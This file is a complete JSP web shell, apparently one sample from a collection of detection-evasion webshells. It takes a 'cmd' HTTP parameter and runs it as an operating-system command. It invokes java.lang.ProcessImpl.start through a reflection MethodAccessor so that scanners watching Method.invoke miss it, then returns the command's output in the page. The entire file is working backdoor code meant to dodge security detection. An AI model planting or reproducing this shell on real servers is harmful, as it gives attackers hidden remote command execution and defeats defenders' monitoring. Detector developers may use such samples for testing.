<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="sun.reflect.ReflectionFactory" %>
<%@ page import="java.security.AccessController" %>
<%@ page import="sun.reflect.MethodAccessor" %>
<html>
<body>
<h2>MethodAccessor.invoke绕过检测Method.invoke的JSP WebShell</h2>
<%!
    public static class Threedr3am_9 {
        public static final Class clz = Class.forName("java.lang.ProcessImpl");
        public static Object[] ooo;
    }
%>
<%
    String s = request.getParameter("cmd");
    Threedr3am_9.ooo = new Object[]{s.split(" "), null, null, null, false};
    Method method = Threedr3am_9.clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
    method.setAccessible(true);
    ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
    MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);
    Process process = (Process) methodAccessor.invoke(null, null);
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while ((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>